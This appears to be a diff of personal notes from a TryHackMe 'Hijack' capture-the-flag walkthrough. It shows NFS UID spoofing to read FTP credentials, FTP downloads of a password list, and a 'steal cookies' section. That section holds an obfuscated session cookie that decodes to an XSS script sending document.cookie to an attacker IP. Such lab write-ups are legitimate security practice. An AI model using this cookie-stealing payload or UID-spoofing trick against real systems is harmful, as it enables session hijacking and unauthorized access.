@@ -76,7 +76,7 @@ ftp> ls
 ftp> exit
 221 Goodbye.
 
-### NFS nothing                                                                                                                                                                                                                                     
+### NFS                                                                                                                                                                                                                                      
 ┌──(duke㉿kali)-[~/Documents/THM_Hijack]
 └─$ showmount 10.10.28.220
 Hosts on 10.10.28.220:
@@ -99,8 +99,85 @@ cd: permission denied: nfs
                                                                                                                                                                                                                                           
 drwx------   2 1003 1003 4096 Aug  8  2023 nfs
 
+### Create user tmpnfs and change UID to 1003
+┌──(duke㉿kali)-[~/Documents/THM_Hijack]
+└─$ su tmpnfs
+Password: 
+┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack]
+└─$ whoami                                                                                                          
+tmpnfs
 
-### www nothing  
+┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack]
+└─$ cd nfs/                                                                                                         
+
+┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack/nfs]
+└─$ ls                                                                                                              
+for_employees.txt
+
+┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack/nfs]
+└─$ cat for_employees.txt 
+ftp creds :
+
+ftpuser:W3stV1rg1n14M0un741nM4m4
+
+
+### back to FTP
+
+──(duke㉿kali)-[~/Documents/THM_Hijack]
+└─$ ftp ftpuser@hijack.thm    
+Connected to hijack.thm.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||15537|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 1002     1002         4096 May 27 09:39 .
+drwxr-xr-x    3 1002     1002         4096 May 27 09:39 ..
+-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
+-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
+-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
+-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
+-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
+drwx------    2 1002     1002         4096 May 27 09:46 test
+226 Directory send OK.
+ftp> mget .passwords_list.txt
+mget .passwords_list.txt [anpqy?]? y
+229 Entering Extended Passive Mode (|||49676|)
+150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
+100% |***********************************************************************|  3150        4.88 MiB/s    00:00 ETA
+226 Transfer complete.
+3150 bytes received in 00:00 (66.42 KiB/s)
+ftp> mget .rom_admin.txt
+ftp> mget .from_admin.txt
+mget .from_admin.txt [anpqy?]? y
+229 Entering Extended Passive Mode (|||9164|)
+150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
+100% |***********************************************************************|   368      589.13 KiB/s    00:00 ETA
+226 Transfer complete.
+368 bytes received in 00:00 (9.70 KiB/s)
+ftp> 
+
+### Files content
+┌──(duke㉿kali)-[~/Documents/THM_Hijack]
+└─$ cat .passwords_list.txt 
+Vxb38mSNN8wxqHxv6uMX
+56J4Zw6cvz8qDvhCWCVy
+...
+                                                                                                                  
+┌──(duke㉿kali)-[~/Documents/THM_Hijack]
+└─$ cat .from_admin.txt    
+To all employees, this is "admin" speaking,
+i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.
+
+NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
+
+
+
+### www enumaretion nothing  
 
 ─(duke㉿kali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hijack.thm -x .php, .txt, .html 
@@ -131,6 +208,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 
 ### Password bruce forcing -- admin 
+
+
+### steal cookies
+UEhQU0VTU0lEPVBITmpjbWx3ZEQ1MllYSWdhVDF1WlhjZ1NXMWhaMlVvS1RzZ2FTNXpjbU05SW1oMGRIQTZMeTh4TUM0NUxqTXdMakl3TWk4JTJGWTI5dmEybGxQU0lyWW5SdllTaGtiMk4xYldWdWRDNWpiMjlyYVdVcE96d3ZjMk55YVhCMFBqcGxNVEJoWkdNek9UUTVZbUUxT1dGaVltVTFObVV3TlRkbU1qQm1PRGd6WlElM0QlM0Q=
+
+PHPSESSID=PHNjcmlwdD52YXIgaT1uZXcgSW1hZ2UoKTsgaS5zcmM9Imh0dHA6Ly8xMC45LjMwLjIwMi8%2FY29va2llPSIrYnRvYShkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0PjplMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZQ%3D%3D
+
                                                                                                                                                                                                                                            
 
 <\code>
